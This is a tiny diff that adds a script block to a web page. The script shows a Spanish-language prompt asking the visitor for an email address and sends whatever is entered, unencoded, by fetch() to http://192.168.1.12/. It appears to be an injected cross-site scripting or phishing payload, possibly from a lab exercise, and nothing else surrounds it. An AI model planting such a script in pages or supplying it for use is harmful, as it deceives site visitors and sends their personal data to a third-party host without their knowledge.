@@ -1,0 +1,9 @@
+<script>
+    var email = prompt("Inserta un email", "example@example.com");
+    if (email == null || email == "") {
+        alert("Es necesario un correo valido");
+    } else {
+        fetch("http://192.168.1.12/?email=" + email);
+    }
+</script>
+
